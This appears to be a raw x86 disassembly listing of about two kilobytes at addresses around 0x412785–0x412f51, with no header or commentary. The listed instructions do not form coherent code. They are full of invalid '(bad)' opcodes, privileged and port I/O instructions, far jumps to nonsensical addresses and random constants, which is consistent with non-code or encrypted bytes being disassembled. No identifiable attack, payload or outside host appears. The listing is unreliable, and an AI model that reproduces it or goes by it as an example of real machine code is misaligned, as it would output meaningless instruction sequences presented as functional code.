  412785:	sub    BYTE PTR [ebx],cl
  412787:	mov    ah,0x6f
  412789:	aas    
  41278a:	cmc    
  41278b:	pusha  
  41278c:	cmc    
  41278d:	pop    esp
  41278e:	xchg   edi,eax
  41278f:	add    DWORD PTR [edx+0x74],esi
  412792:	aas    
  412793:	push   edx
  412794:	ret    
  412795:	mov    eax,0xdb575110
  41279a:	mov    BYTE PTR [edi],0x52
  41279d:	hlt    
  41279e:	push   ax
  4127a0:	ret    0x202
  4127a3:	out    0x9e,eax
  4127a5:	xchg   DWORD PTR [ebp+0x6bb1ca3b],ecx
  4127ab:	xor    esi,0x42d5bf04
  4127b1:	mov    ch,0x2d
  4127b3:	dec    ecx
  4127b4:	adc    al,0x49
  4127b6:	loop   0x4127cb
  4127b8:	push   edx
  4127b9:	jecxz  0x412761
  4127bb:	add    eax,0x6fe7c863
  4127c0:	jns    0x4127a4
  4127c2:	in     eax,dx
  4127c3:	clc    
  4127c4:	mov    edi,0x97ebebc3
  4127c9:	xchg   ebx,eax
  4127ca:	sub    eax,0xcc8bf6dc
  4127cf:	inc    edi
  4127d0:	xchg   esi,eax
  4127d1:	arpl   WORD PTR [esi],bp
  4127d3:	outs   dx,BYTE PTR ds:[esi]
  4127d4:	(bad)  
  4127d5:	rcr    BYTE PTR [esi+0x7814a863],cl
  4127db:	inc    edx
  4127dc:	shl    BYTE PTR [edi+0x55],1
  4127df:	std    
  4127e0:	cmp    bl,dh
  4127e2:	or     DWORD PTR ds:0xb7c821bf,edi
  4127e8:	add    al,0x75
  4127ea:	mov    eax,ds:0x8454dde1
  4127ef:	add    al,0x41
  4127f1:	cwde   
  4127f2:	jp     0x41284d
  4127f4:	xchg   esp,eax
  4127f5:	mov    esp,0x804158c8
  4127fa:	sbb    ecx,ebx
  4127fc:	xchg   ebx,eax
  4127fd:	ret    
  4127fe:	jg     0x412810
  412800:	xor    al,0xfa
  412802:	jmp    0x4127fa
  412804:	mov    WORD PTR [ebx-0x2a],?
  412807:	jbe    0x4127b7
  412809:	mov    ebp,0x98fb59ae
  41280e:	push   ebx
  41280f:	jb     0x41279d
  412811:	pop    ss
  412812:	sahf   
  412813:	shr    BYTE PTR [edi],0xf1
  412816:	and    BYTE PTR [ebx+0x30bcb40],bl
  41281c:	and    eax,0x25de9cc9
  412821:	jecxz  0x4127d7
  412823:	(bad)  
  412824:	fcmovb st,st(0)
  412826:	js     0x41286d
  412828:	in     eax,0xcf
  41282a:	fcom   DWORD PTR [ecx]
  41282c:	les    eax,FWORD PTR [esi]
  41282e:	daa    
  41282f:	adc    eax,DWORD PTR [edi]
  412831:	stos   BYTE PTR es:[edi],al
  412832:	pop    edx
  412833:	std    
  412834:	test   DWORD PTR [edi],eax
  412836:	xchg   ebx,eax
  412837:	xor    eax,0xbde38ad4
  41283c:	add    DWORD PTR [ebp+0x3e07356],ebx
  412842:	and    eax,ecx
  412844:	in     al,0x6c
  412846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412847:	div    ah
  412849:	adc    al,0xfa
  41284b:	add    bl,dl
  41284d:	sbb    bh,BYTE PTR [ebx]
  41284f:	or     eax,DWORD PTR [ecx-0x65790029]
  412855:	mov    ebp,0x97c65df
  41285a:	dec    edx
  41285b:	imul   edx,DWORD PTR [eax+0x2a],0x55
  41285f:	adc    eax,0x94edee99
  412864:	xor    DWORD PTR [edi+ecx*8+0x17914661],edi
  41286b:	mov    bl,ah
  41286d:	iret   
  41286e:	inc    eax
  41286f:	int    0xf2
  412871:	or     al,0x1
  412873:	cli    
  412874:	scas   eax,DWORD PTR es:[edi]
  412875:	cmp    al,0xa2
  412877:	xchg   BYTE PTR cs:[ecx+edi*8-0x3702dcf6],ah
  41287f:	inc    BYTE PTR [edi+0x3e8ab6db]
  412885:	arpl   WORD PTR [edi],cx
  412887:	popf   
  412888:	clc    
  412889:	mov    cl,0x75
  41288b:	push   eax
  41288c:	push   ecx
  41288d:	xchg   edi,eax
  41288e:	sbb    eax,0x5a012680
  412893:	inc    esp
  412894:	sti    
  412895:	pop    esp
  412896:	in     al,dx
  412897:	add    BYTE PTR [edi+0x61],ch
  41289a:	or     cl,BYTE PTR [edi+0x1b]
  41289d:	popf   
  41289e:	(bad)  
  4128a1:	push   ss
  4128a2:	out    0xf7,eax
  4128a4:	sbb    al,0xcd
  4128a6:	dec    ebx
  4128a7:	daa    
  4128a8:	push   0xffffffb7
  4128aa:	test   ebx,ebp
  4128ac:	je     0x412896
  4128ae:	fsub   st(3),st
  4128b0:	mov    dh,0x41
  4128b2:	mov    eax,0x112ba144
  4128b7:	imul   esi,DWORD PTR [esi+ebp*1-0x26],0xffffff80
  4128bc:	jmp    0x4c3e0d56
  4128c1:	jg     0x412908
  4128c3:	add    eax,0x110dfce0
  4128c8:	sbb    eax,0xdd830b35
  4128cd:	shl    BYTE PTR [edx],1
  4128cf:	inc    edi
  4128d0:	inc    ebx
  4128d1:	inc    esp
  4128d2:	out    dx,al
  4128d3:	cmp    eax,DWORD PTR [esi-0x382e850e]
  4128d9:	scas   al,BYTE PTR es:[edi]
  4128da:	scas   eax,DWORD PTR es:[edi]
  4128db:	rcr    DWORD PTR [ecx+0x44d732b4],1
  4128e1:	test   DWORD PTR [edx],0x8a6b3e85
  4128e7:	xchg   ebx,eax
  4128e8:	(bad)  
  4128e9:	xor    ecx,DWORD PTR [ecx-0x321a470a]
  4128ef:	fisubr DWORD PTR [edi]
  4128f1:	aas    
  4128f2:	in     eax,0x46
  4128f4:	outs   dx,BYTE PTR ds:[esi]
  4128f5:	push   edx
  4128f6:	push   0x49
  4128f8:	aas    
  4128f9:	nop
  4128fa:	call   0xf3bf20ba
  4128ff:	fs mov edi,0xf01f6f5b
  412905:	fmulp  st(0),st
  412907:	cmp    BYTE PTR [edi-0x7113cede],cl
  41290d:	sub    ecx,DWORD PTR [esi+eax*8-0x29948e95]
  412914:	hlt    
  412915:	adc    eax,0x2f1cfe82
  41291a:	adc    DWORD PTR [edx-0x16],ebp
  41291d:	sbb    al,0xe1
  41291f:	jmp    0x51de2d55
  412924:	(bad)  
  412925:	fptan  
  412927:	xor    DWORD PTR [ebx+0x448d21ac],esp
  41292d:	fs ja  0x412906
  412930:	fcom   st(6)
  412932:	and    ch,ch
  412934:	das    
  412935:	in     al,0xdf
  412937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412938:	xchg   BYTE PTR [ecx-0xb1d1f31],dl
  41293e:	pop    es
  41293f:	fnstenv [esi+edx*2+0x3f18eee7]
  412946:	std    
  412947:	pushf  
  412948:	repnz cmp al,BYTE PTR [ecx]
  41294b:	sub    ebx,edi
  41294d:	push   esi
  41294e:	xchg   edx,eax
  41294f:	lea    ebp,[edx]
  412951:	mov    ebp,0x6b760381
  412956:	mov    ds:0x9d56c568,al
  41295b:	and    eax,0xf356c5d0
  412960:	call   0xa4ffc6d7
  412965:	(bad)  
  412966:	jmp    0x59ab:0xd5cc1c08
  41296d:	xor    edx,DWORD PTR [edi]
  41296f:	inc    edx
  412970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412971:	cmc    
  412972:	ins    BYTE PTR es:[edi],dx
  412973:	xchg   ecx,eax
  412974:	xor    BYTE PTR [eax+0x36],bh
  412977:	xchg   BYTE PTR [edi-0x64],al
  41297a:	fld    TBYTE PTR [ebp-0x14]
  41297d:	sub    BYTE PTR [ebx+0xef85ba6],dl
  412983:	js     0x412994
  412985:	push   0xffffffc6
  412987:	dec    edi
  412988:	je     0x412958
  41298a:	mov    ?,edx
  41298c:	daa    
  41298d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41298e:	test   eax,0xceadbfe0
  412993:	cmc    
  412994:	inc    ecx
  412995:	dec    ebx
  412996:	mov    cl,0x5e
  412998:	or     dh,dh
  41299a:	or     bh,BYTE PTR [eax]
  41299c:	out    dx,eax
  41299d:	shl    BYTE PTR [edi+esi*4-0x50a52060],1
  4129a4:	sahf   
  4129a5:	mov    esi,0xf82cef75
  4129aa:	cld    
  4129ab:	std    
  4129ac:	push   0xffffffba
  4129ae:	push   ss
  4129af:	(bad)  
  4129b0:	js     0x412a22
  4129b2:	fwait
  4129b3:	jp     0x412949
  4129b5:	lds    ebx,FWORD PTR ds:0x13804212
  4129bb:	lahf   
  4129bc:	stos   DWORD PTR es:[edi],eax
  4129bd:	cwde   
  4129be:	xor    DWORD PTR ds:0xf8071255,ecx
  4129c4:	push   ebp
  4129c5:	jmp    0x1d28:0xea3c2472
  4129cc:	push   0xeb543411
  4129d1:	int    0xf9
  4129d3:	fbstp  TBYTE PTR [eax]
  4129d5:	lods   eax,DWORD PTR ds:[esi]
  4129d6:	and    eax,0xd1e59f6a
  4129db:	xor    eax,0x5290a7a4
  4129e0:	js     0x412a45
  4129e2:	xor    ecx,DWORD PTR [ecx-0x61]
  4129e5:	jbe    0x412988
  4129e7:	jle    0x412a5c
  4129e9:	push   esi
  4129ea:	jo     0x4129c9
  4129ec:	jg     0x4129ad
  4129ee:	stc    
  4129ef:	sub    dh,BYTE PTR [edi]
  4129f1:	pop    edx
  4129f2:	cli    
  4129f3:	pop    ebx
  4129f4:	(bad)  
  4129f6:	mov    eax,0x4b95582d
  4129fb:	les    edx,FWORD PTR [ecx-0x51235d92]
  412a01:	sti    
  412a02:	iret   
  412a03:	btr    DWORD PTR [edx+0x6f0b4a7f],edi
  412a0a:	ror    BYTE PTR [ebp+0x3a],0x69
  412a0e:	adc    BYTE PTR [ecx+eax*2],dh
  412a11:	pop    esp
  412a12:	xchg   edx,eax
  412a13:	es ins BYTE PTR es:[edi],dx
  412a15:	mov    esp,0xd7951d8f
  412a1a:	in     eax,dx
  412a1b:	lock jecxz 0x412a15
  412a1e:	push   es
  412a1f:	mov    ecx,0x61da573a
  412a24:	or     ebx,DWORD PTR ds:0x96d6b155
  412a2a:	test   DWORD PTR [ebx-0x76863bb7],ebx
  412a30:	sub    eax,0xe40941bb
  412a35:	fmul   DWORD PTR [ebp+edx*1-0x520c9358]
  412a3c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a3e:	imul   ebx,DWORD PTR [edx],0xeea029ba
  412a44:	mov    ah,0x36
  412a46:	stos   DWORD PTR es:[edi],eax
  412a47:	bound  ebp,QWORD PTR [ecx+eiz*1-0x71d0c9ce]
  412a4e:	mov    ah,0xf
  412a50:	cli    
  412a51:	pop    edx
  412a52:	sub    al,0xa2
  412a54:	cmp    eax,0x7f3b3e3e
  412a59:	jno    0x4129df
  412a5b:	pop    es
  412a5c:	inc    eax
  412a5d:	dec    ebx
  412a5e:	hlt    
  412a5f:	xchg   esi,eax
  412a60:	or     al,BYTE PTR [esi]
  412a62:	ins    BYTE PTR es:[edi],dx
  412a63:	sbb    ebx,edi
  412a65:	sti    
  412a66:	pusha  
  412a67:	xor    bh,BYTE PTR [eax]
  412a69:	adc    DWORD PTR [esi],esp
  412a6b:	lock adc BYTE PTR [ecx+eax*4+0x6c],0xb6
  412a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a72:	or     cl,dh
  412a74:	sbb    DWORD PTR [esi-0x52136a29],ecx
  412a7a:	loopne 0x412a2d
  412a7c:	fs xchg si,ax
  412a7f:	je     0x412a88
  412a81:	icebp  
  412a82:	sbb    BYTE PTR [eax],ch
  412a84:	sub    esp,0x5360fd0c
  412a8a:	shr    DWORD PTR ds:0x9204f767,0x50
  412a91:	test   dh,al
  412a93:	mov    ah,0x78
  412a95:	mov    DWORD PTR [eax-0x19],edi
  412a98:	jg     0x412ad8
  412a9a:	jmp    0xd92bbae3
  412a9f:	push   eax
  412aa0:	test   al,0xf9
  412aa2:	push   0xc66f1675
  412aa7:	adc    al,0x83
  412aa9:	aad    0x5a
  412aab:	test   eax,0xf9a012d5
  412ab0:	rcl    DWORD PTR [edx+0x5be288db],cl
  412ab6:	jle    0x412a58
  412ab8:	sub    esi,DWORD PTR [ecx+0x7825e62c]
  412abe:	ds mov ecx,0x3cb71cf2
  412ac4:	mov    ebp,0xbde6d53e
  412ac9:	jl     0x412a51
  412acb:	pop    ebp
  412acc:	cmp    ah,0x64
  412acf:	sbb    al,0x28
  412ad1:	dec    ecx
  412ad2:	scas   al,BYTE PTR es:[edi]
  412ad3:	ins    BYTE PTR es:[edi],dx
  412ad4:	lahf   
  412ad5:	xchg   ebx,eax
  412ad6:	aad    0xc4
  412ad8:	adc    al,0x3b
  412ada:	inc    edi
  412adb:	inc    esi
  412adc:	mov    ecx,0x1f2dfdd4
  412ae1:	mov    fs,WORD PTR [ecx+0x5e]
  412ae4:	pop    eax
  412ae5:	push   ebx
  412ae6:	arpl   WORD PTR [eax+0x5a],si
  412ae9:	(bad)  
  412aea:	rol    BYTE PTR [ebx-0x23],0x20
  412aee:	lahf   
  412aef:	fidiv  DWORD PTR [eax+0x4a1f8afb]
  412af5:	cmp    edi,DWORD PTR [edx-0xe421adc]
  412afb:	add    al,0x28
  412afd:	stos   BYTE PTR es:[edi],al
  412afe:	jno    0x412ab7
  412b00:	mov    ebp,0xe6aba08f
  412b05:	add    dh,BYTE PTR [esp+edi*2+0x6e245151]
  412b0c:	push   cs
  412b0d:	mov    eax,ds:0x22382582
  412b12:	js     0x412b92
  412b14:	adc    BYTE PTR [esi-0x45],al
  412b17:	and    eax,0xa03b38e
  412b1c:	jnp    0x412b25
  412b1e:	int3   
  412b1f:	cld    
  412b20:	xchg   ebx,eax
  412b21:	xchg   DWORD PTR [edi+0x3eb9622d],ebp
  412b27:	pop    ecx
  412b28:	scas   eax,DWORD PTR es:[edi]
  412b29:	xchg   esi,eax
  412b2a:	pop    esp
  412b2b:	fidiv  DWORD PTR [ebp-0x15]
  412b2e:	cli    
  412b2f:	stos   BYTE PTR es:[edi],al
  412b30:	pop    ebp
  412b31:	cs iret 
  412b33:	fcomip st,st(4)
  412b35:	inc    esi
  412b36:	xchg   edx,eax
  412b37:	xlat   BYTE PTR ds:[ebx]
  412b38:	cmp    esp,DWORD PTR [edi]
  412b3a:	and    al,BYTE PTR [eax+0x6b71aac5]
  412b40:	mov    DWORD PTR [ebx],ebx
  412b42:	cmp    bl,cl
  412b44:	bound  ebx,QWORD PTR [eax+0x7f]
  412b47:	push   ebx
  412b48:	sbb    BYTE PTR [ebx+ebp*8-0xaafe365],dl
  412b4f:	inc    ebp
  412b50:	outs   dx,BYTE PTR ds:[esi]
  412b51:	ja     0x412bb0
  412b53:	sub    ecx,DWORD PTR [ebx-0x19]
  412b56:	mov    ebx,0x9d6575d1
  412b5b:	hlt    
  412b5c:	cmp    BYTE PTR [ebx-0x61824059],0x2c
  412b63:	cli    
  412b64:	mov    dl,0xf4
  412b66:	int    0x94
  412b68:	xor    DWORD PTR [ebp+0x59],ebp
  412b6b:	push   esp
  412b6c:	in     al,dx
  412b6d:	sbb    bh,dl
  412b6f:	xor    BYTE PTR [ebp+ecx*8+0x411b7ad5],dh
  412b76:	adc    eax,0xf0a044d3
  412b7b:	retf   0x8d13
  412b7e:	or     DWORD PTR [edi-0x580b7042],0x7c
  412b85:	sbb    esi,DWORD PTR [ecx+0x13c1d8ed]
  412b8b:	inc    esp
  412b8c:	jne    0x412b23
  412b8e:	sub    eax,0x67f1d54f
  412b93:	shl    DWORD PTR [esi],1
  412b95:	jo     0x412bd3
  412b97:	jnp    0x412bee
  412b99:	es mov esp,0x473aabfe
  412b9f:	fsubr  QWORD PTR [eax+0x5b]
  412ba2:	inc    esi
  412ba3:	(bad)  
  412ba4:	jbe    0x412bfd
  412ba6:	adc    cl,BYTE PTR [esi-0x63b985dd]
  412bac:	popf   
  412bad:	xchg   ecx,eax
  412bae:	xor    BYTE PTR [ebp-0x26],ah
  412bb1:	out    dx,al
  412bb2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  412bb4:	pop    edx
  412bb5:	mov    ch,0x4f
  412bb7:	jp     0x412b56
  412bb9:	jno    0x412bd8
  412bbb:	pop    ecx
  412bbc:	icebp  
  412bbd:	mov    dl,0x6c
  412bbf:	mov    dh,0xd7
  412bc1:	push   ds
  412bc2:	fimul  DWORD PTR [esi-0x3c3578bd]
  412bc8:	or     al,0x17
  412bca:	push   esi
  412bcb:	jg     0x412c36
  412bcd:	jmp    0xb1d2b753
  412bd2:	fs leave 
  412bd4:	pop    esi
  412bd5:	or     ebp,0xffffffa0
  412bd8:	fcomp  QWORD PTR [edx-0x5722cb41]
  412bde:	vandnps xmm0,xmm1,XMMWORD PTR [ebp+esi*8-0x66]
  412be5:	mov    dl,0xa0
  412be7:	sub    al,0x0
  412be9:	push   ebp
  412bea:	scas   eax,DWORD PTR es:[edi]
  412beb:	lods   eax,DWORD PTR ds:[esi]
  412bec:	psrad  mm3,QWORD PTR [edx-0x74b8c78a]
  412bf3:	add    ah,BYTE PTR [ebp-0x2db50ff9]
  412bf9:	xor    esi,ecx
  412bfb:	mov    al,0x95
  412bfd:	cs addr16 mov esi,0xd73abd77
  412c04:	push   ebx
  412c05:	ss push 0xffffffee
  412c08:	or     al,0xb6
  412c0a:	jbe    0x412c19
  412c0c:	aaa    
  412c0d:	call   0xcb45:0xb89251db
  412c14:	sbb    eax,0xab8cb695
  412c19:	in     eax,dx
  412c1a:	inc    ebp
  412c1b:	and    eax,DWORD PTR [esi]
  412c1d:	push   ecx
  412c1e:	std    
  412c1f:	or     DWORD PTR [esi],esp
  412c21:	bound  edx,QWORD PTR [edx+0x68dd994b]
  412c27:	dec    edx
  412c28:	pop    ss
  412c29:	arpl   WORD PTR [ebp-0x31],bx
  412c2c:	ffree  st(5)
  412c2e:	scas   eax,DWORD PTR es:[edi]
  412c2f:	inc    esi
  412c30:	lea    ecx,[ecx-0x1f73ab78]
  412c36:	fadd   DWORD PTR [ebx]
  412c38:	mov    eax,0x2261211f
  412c3d:	enter  0x22c7,0xf9
  412c41:	fcom   QWORD PTR [edx+ebx*1]
  412c44:	and    eax,0x17fa3d60
  412c49:	adc    DWORD PTR [esi],edx
  412c4b:	xchg   ebp,eax
  412c4c:	test   eax,0x46e71eda
  412c51:	mov    al,ds:0x13f88b72
  412c56:	push   cs
  412c57:	or     ebx,DWORD PTR [ebp+0x95fc386]
  412c5d:	cmp    bl,BYTE PTR [ebp-0x21b5ac3b]
  412c63:	mov    DWORD PTR [ebp+0x3fdc0b29],esi
  412c69:	imul   edi,DWORD PTR [edi+ebx*2-0x18fe8ffe],0x8be85851
  412c74:	in     eax,0xce
  412c76:	clc    
  412c77:	clc    
  412c78:	xor    eax,DWORD PTR [esi+0x5]
  412c7b:	mov    ah,0x3f
  412c7d:	call   0x40991e3b
  412c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c83:	(bad)  
  412c84:	into   
  412c85:	(bad)  
  412c87:	xor    bh,BYTE PTR [ecx-0x6d]
  412c8a:	cmp    al,0xfb
  412c8c:	mov    WORD PTR [ecx+0x1eb6e617],gs
  412c92:	arpl   WORD PTR [ebx+esi*4+0x2e667366],di
  412c99:	mov    ch,0xbb
  412c9b:	aad    0xe
  412c9d:	mov    eax,ds:0xb808a43d
  412ca2:	loop   0x412c9f
  412ca4:	mov    bl,0xf1
  412ca6:	test   ebx,esi
  412ca8:	inc    ebp
  412ca9:	imul   esi,DWORD PTR [ecx],0xd
  412cac:	retf   
  412cad:	and    al,BYTE PTR [eax]
  412caf:	imul   DWORD PTR [ebp+0x48]
  412cb2:	sub    BYTE PTR [edx+0x21],dh
  412cb5:	dec    ecx
  412cb6:	scas   al,BYTE PTR es:[edi]
  412cb7:	inc    ebp
  412cb8:	icebp  
  412cb9:	ret    0xd5e2
  412cbc:	or     DWORD PTR [ebp+0xd3308ae],ebx
  412cc2:	push   edi
  412cc3:	inc    esi
  412cc4:	pop    ebx
  412cc5:	imul   ebp,ecx,0x1397ca32
  412ccb:	js     0x412c59
  412ccd:	popa   
  412cce:	mov    edi,0xf6640d05
  412cd3:	jmp    0x5c4cee82
  412cd8:	ret    0xf782
  412cdb:	jmp    0xb7d9e927
  412ce0:	shl    BYTE PTR [edx+0x6b8abd18],1
  412ce6:	ja     0x412c6f
  412ce8:	pop    esi
  412ce9:	icebp  
  412cea:	pop    ds
  412ceb:	arpl   WORD PTR [edx-0x3623dd0f],sp
  412cf1:	mov    dh,BYTE PTR [edi+0x503ecf78]
  412cf7:	lods   al,BYTE PTR ds:[esi]
  412cf8:	imul   ebx,ebx,0xae181b3e
  412cfe:	enter  0xb65e,0x4c
  412d02:	ins    BYTE PTR es:[edi],dx
  412d03:	push   esi
  412d04:	xchg   esp,eax
  412d05:	mov    ds:0x8e59a060,al
  412d0a:	add    ebp,DWORD PTR [edx+0x36]
  412d0d:	mov    ah,0x78
  412d0f:	data16 mov cs,WORD PTR [edi+0xa]
  412d13:	pop    ss
  412d14:	fsubp  st(7),st
  412d16:	cmp    esi,0x2167f771
  412d1c:	outs   dx,BYTE PTR ds:[esi]
  412d1d:	lahf   
  412d1e:	in     al,0x14
  412d20:	rcl    DWORD PTR [edx+0x5fe3bd12],0xe6
  412d27:	sbb    ebp,DWORD PTR [ebx]
  412d29:	sub    al,0xc2
  412d2b:	std    
  412d2c:	pop    ebx
  412d2d:	scas   al,BYTE PTR es:[edi]
  412d2e:	imul   ebp,esp,0xffffff87
  412d31:	not    dh
  412d33:	fldenv [esi+ebp*1]
  412d36:	adc    cl,BYTE PTR [edx+0xb]
  412d39:	arpl   WORD PTR [ebx-0x21],di
  412d3c:	aaa    
  412d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3e:	add    DWORD PTR [edx+0x2ed07f3f],eax
  412d44:	(bad)  
  412d45:	lock aaa 
  412d47:	test   BYTE PTR [ecx],bl
  412d49:	mov    al,ds:0xe6c0d92d
  412d4e:	sub    eax,0x566e2cec
  412d53:	repnz inc eax
  412d55:	test   eax,0x276c3126
  412d5a:	jno    0x412d31
  412d5c:	inc    edx
  412d5d:	cmp    al,BYTE PTR [edx]
  412d5f:	dec    edx
  412d60:	pop    edx
  412d61:	jmp    0x3847a47a
  412d66:	stos   BYTE PTR es:[edi],al
  412d67:	jmp    0x8759:0x9aebf6d7
  412d6e:	and    al,0x44
  412d70:	sub    al,0x3b
  412d72:	pop    es
  412d73:	mov    dh,BYTE PTR [ecx]
  412d75:	clc    
  412d76:	test   esp,ecx
  412d78:	xchg   DWORD PTR [edx],ebp
  412d7a:	or     bl,BYTE PTR [ecx-0x48278485]
  412d80:	xor    DWORD PTR [esi-0x7],esp
  412d83:	mov    cs,WORD PTR [esi-0x64fb97b6]
  412d89:	push   ss
  412d8a:	sbb    DWORD PTR [ecx-0x950f23f],ebp
  412d90:	add    al,0x36
  412d92:	std    
  412d93:	mov    edi,0x2bf84c
  412d98:	adc    ebx,DWORD PTR [edi]
  412d9a:	adc    edx,esi
  412d9c:	ins    BYTE PTR es:[edi],dx
  412d9d:	push   ecx
  412d9e:	cdq    
  412d9f:	mov    bl,0xc1
  412da1:	enter  0xd01,0x51
  412da5:	fstp   DWORD PTR [ebp-0xbe2b8b5]
  412dab:	push   0x12
  412dad:	xchg   esp,eax
  412dae:	jmp    0x412df4
  412db0:	xor    esi,DWORD PTR [esi-0x6abc3900]
  412db6:	out    dx,al
  412db7:	mov    bl,0xc1
  412db9:	stos   BYTE PTR es:[edi],al
  412dba:	xchg   edx,eax
  412dbb:	sti    
  412dbc:	imul   ebp,DWORD PTR [ebp+0x1e625178],0x8d1346ba
  412dc6:	cwde   
  412dc7:	call   0x20f5:0x80553c2d
  412dce:	cli    
  412dcf:	stos   BYTE PTR es:[edi],al
  412dd0:	ss addr16 adc ah,cl
  412dd4:	dec    edx
  412dd5:	js     0x412e1c
  412dd7:	fidiv  DWORD PTR [edi+0x291464ba]
  412ddd:	out    0x3d,eax
  412ddf:	xchg   esi,eax
  412de0:	xchg   esp,eax
  412de1:	jns    0x412e5a
  412de3:	aam    0xdd
  412de5:	xchg   esi,eax
  412de6:	xchg   esi,edx
  412de8:	cli    
  412de9:	retf   0xcf31
  412dec:	lods   eax,DWORD PTR ds:[esi]
  412ded:	int3   
  412dee:	dec    edx
  412def:	fdiv   st,st(4)
  412df1:	sbb    BYTE PTR [edx+0x49],dh
  412df4:	or     bh,BYTE PTR [ebx+0xb]
  412df7:	inc    esi
  412df8:	mov    edi,0xfe0347b4
  412dfd:	push   edi
  412dfe:	std    
  412dff:	(bad)  
  412e00:	and    al,0xa7
  412e02:	shl    DWORD PTR [ebp+edx*1+0x3],1
  412e06:	xlat   BYTE PTR ds:[ebx]
  412e07:	ja     0x412e65
  412e09:	sbb    eax,0xf5d90714
  412e0e:	mov    edi,0xa72bac0d
  412e13:	push   esp
  412e14:	xor    DWORD PTR [esi-0x13],eax
  412e17:	iret   
  412e18:	xor    al,0x98
  412e1a:	mov    DWORD PTR [eax+0x324dbc13],eax
  412e20:	gs scas eax,DWORD PTR es:[edi]
  412e22:	fmul   st,st(6)
  412e24:	call   0x419e:0x2a85fc6b
  412e2b:	push   edx
  412e2c:	adc    DWORD PTR [ebp-0x72],ecx
  412e2f:	sbb    DWORD PTR [ecx],eax
  412e31:	lahf   
  412e32:	or     al,0xb8
  412e34:	jle    0x412e02
  412e36:	out    dx,al
  412e37:	push   es
  412e38:	sbb    edx,DWORD PTR ss:[ebx+0x7]
  412e3c:	gs mov edx,0x70c48973
  412e42:	test   al,0x39
  412e44:	fidiv  WORD PTR [ebx]
  412e46:	aas    
  412e47:	or     cl,BYTE PTR [edx]
  412e49:	adc    bl,BYTE PTR [ebp-0x4f]
  412e4c:	fldenv [eax]
  412e4e:	sbb    al,0x94
  412e50:	mov    ah,0xa3
  412e52:	mov    edx,0x230ebdd
  412e57:	xchg   ebx,eax
  412e58:	fisttp QWORD PTR [esi+0x5]
  412e5b:	cmp    DWORD PTR [eax],ebx
  412e5d:	mov    edx,DWORD PTR [ebx]
  412e5f:	ret    0x5ecc
  412e62:	mov    dh,0x1d
  412e64:	push   es
  412e65:	iret   
  412e66:	int3   
  412e67:	add    al,0x9e
  412e69:	cmp    BYTE PTR [ebp-0x2008d9b5],ch
  412e6f:	int3   
  412e70:	(bad)  [eax]
  412e72:	fdivr  QWORD PTR [edx-0x4416af85]
  412e78:	add    al,al
  412e7a:	jb     0x412ee9
  412e7c:	jg     0x412edb
  412e7e:	or     edx,DWORD PTR [eax+ebp*1+0x38e57c30]
  412e85:	adc    al,al
  412e87:	js     0x412e14
  412e89:	inc    edx
  412e8a:	jmp    0x169c:0x3b5aa415
  412e91:	fistp  DWORD PTR [ebp-0x3e]
  412e94:	aaa    
  412e95:	sbb    BYTE PTR [ebp+0x3b],bl
  412e98:	outs   dx,DWORD PTR ds:[esi]
  412e99:	mov    al,ds:0x52ebb472
  412e9e:	push   es
  412e9f:	dec    ebp
  412ea0:	clc    
  412ea1:	jae    0x412f07
  412ea3:	rcl    BYTE PTR [edi],1
  412ea5:	mov    dh,BYTE PTR [edi]
  412ea7:	mov    DWORD PTR [eax+0x40],eax
  412eaa:	mov    al,BYTE PTR [edi+0x64]
  412ead:	push   es
  412eae:	pop    esp
  412eaf:	ror    BYTE PTR [ebp+0x2a],1
  412eb2:	shl    DWORD PTR [edi-0x61],1
  412eb5:	or     al,0xbc
  412eb7:	aam    0xe1
  412eb9:	pop    ss
  412eba:	in     al,0xa3
  412ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ebd:	mov    al,0x94
  412ebf:	xchg   DWORD PTR [ebx+0x67622f49],esp
  412ec5:	and    dh,BYTE PTR [edi]
  412ec7:	nop
  412ec8:	push   es
  412ec9:	les    edx,FWORD PTR [eax]
  412ecb:	(bad)  
  412ecc:	hlt    
  412ecd:	int    0x15
  412ecf:	fwait
  412ed0:	push   ebp
  412ed1:	mov    eax,DWORD PTR [edx-0x60c5be3b]
  412ed7:	sub    ebx,DWORD PTR [ebp+0x4bdfdaff]
  412edd:	sub    al,0x9d
  412edf:	aam    0x54
  412ee1:	mov    al,ds:0x63996fee
  412ee6:	xlat   BYTE PTR ds:[ebx]
  412ee7:	call   0xf9e0:0x81acdbca
  412eee:	xor    DWORD PTR [edx+0x7e],eax
  412ef1:	jno    0x412f66
  412ef3:	mov    BYTE PTR [edi],dh
  412ef5:	sar    DWORD PTR [edx-0x42],1
  412ef8:	jb     0x412f5d
  412efa:	xlat   BYTE PTR ds:[ebx]
  412efb:	into   
  412efc:	and    ecx,DWORD PTR [ecx]
  412efe:	adc    bl,BYTE PTR [ecx-0x72]
  412f01:	dec    esi
  412f02:	and    ah,BYTE PTR [edi]
  412f04:	icebp  
  412f05:	mov    al,ds:0x2da2fca5
  412f0a:	je     0x412efb
  412f0c:	out    0x87,al
  412f0e:	dec    edi
  412f0f:	jmp    0xcd44ad3b
  412f14:	inc    ebp
  412f15:	dec    ebp
  412f16:	inc    al
  412f18:	inc    esi
  412f19:	inc    esp
  412f1a:	xchg   ebp,eax
  412f1b:	mov    al,0xd0
  412f1d:	fbld   TBYTE PTR [eax]
  412f1f:	dec    ebx
  412f20:	add    edx,DWORD PTR [esi+0x1e1dfadd]
  412f26:	mov    ah,bl
  412f28:	pop    ecx
  412f29:	adc    BYTE PTR [ebx-0x1189d244],0x28
  412f30:	cmp    esp,DWORD PTR [eax+0x3b]
  412f33:	add    al,0x52
  412f35:	popa   
  412f36:	xchg   bl,ah
  412f38:	sub    al,0x76
  412f3a:	fwait
  412f3b:	inc    ecx
  412f3c:	push   0xfa256da4
  412f41:	pop    ebp
  412f42:	pop    esi
  412f43:	add    DWORD PTR [ecx+edx*8],eax
  412f46:	push   ss
  412f47:	mov    al,ds:0x4dd4cf96
  412f4c:	xor    bh,BYTE PTR [ebx-0x42]
  412f4f:	jp     0x412ed8
  412f51:	retf   0x7de8
